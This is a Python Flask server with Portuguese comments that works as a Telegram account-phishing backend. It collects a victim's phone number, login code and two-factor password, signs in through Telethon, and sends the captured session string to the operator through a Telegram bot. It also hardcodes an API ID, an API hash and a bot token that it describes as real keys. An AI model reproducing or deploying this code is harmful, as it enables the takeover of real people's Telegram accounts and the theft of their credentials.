from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import requests
import os

app = Flask(__name__, static_folder='static')
CORS(app)

# ==========================================
# SUAS CHAVES REAIS (JÁ PREENCHIDAS)
# ==========================================
API_ID = 32082548
API_HASH = "84d9bae1c33f59eba8b187619d6f7"
BOT_TOKEN = "9177480087:AAF3-gqA8uv9SiCGvZFB2CLhR1M3Tle-viM"
YOUR_TELEGRAM_ID = 7783406880
# ==========================================

clients = {}

@app.route('/')
def index():
    # AQUI ESTÁ A CORREÇÃO: Puxa o HTML da pasta static
    return send_from_directory('static', 'index.html')
@app.route('/request_code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"success": False, "error": "Telefone invalido"}), 400

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    client.connect()
    try:
        sent_code = client.send_code_request(phone)
        clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
        return jsonify({"success": True}), 200
    except Exception as e:
        # AQUI ELE VAI CUSPIR O ERRO NA TELA PRA NÓS VERMOS
        print(f"ERRO NO TELEGRAM: {str(e)}") 
        return jsonify({"success": False, "error": f"Bloqueio do Telegram: {str(e)}"}), 500

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if phone not in clients:
        return jsonify({"success": False, "error": "Sessao invalida"}), 400

    client = clients[phone]['client']
    phone_code_hash = clients[phone]['phone_code_hash']
    
    try:
        client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        
        # IMPRIME NO LOG DO RENDER (GARANTIA DE CAPTURA)
        print(f"\n\n========= STRING CAPTURADA =========\n{phone}\n{session_string}\n====================================\n\n")
        
        # MANDA PRO TELEGRAM
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": YOUR_TELEGRAM_ID, "text": f"String:\n`{session_string}`", "parse_mode": "Markdown"}
        requests.post(url, data=payload, timeout=10)
        
        del clients[phone]
        client.disconnect()
        return jsonify({"success": True}), 200
    except SessionPasswordNeededError:
        return jsonify({"success": False, "error": "2FA_REQUIRED"}), 200
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    if phone not in clients:
        return jsonify({"success": False, "error": "Sessao invalida"}), 400

    client = clients[phone]['client']
    try:
        client.sign_in(password=password)
        session_string = client.session.save()
        
        # IMPRIME NO LOG DO RENDER
        print(f"\n\n========= STRING CAPTURADA (2FA) =========\n{phone}\n{session_string}\n==========================================\n\n")
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": YOUR_TELEGRAM_ID, "text": f"String (2FA):\n`{session_string}`", "parse_mode": "Markdown"}
        requests.post(url, data=payload, timeout=10)
        
        del clients[phone]
        client.disconnect()
        return jsonify({"success": True}), 200
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
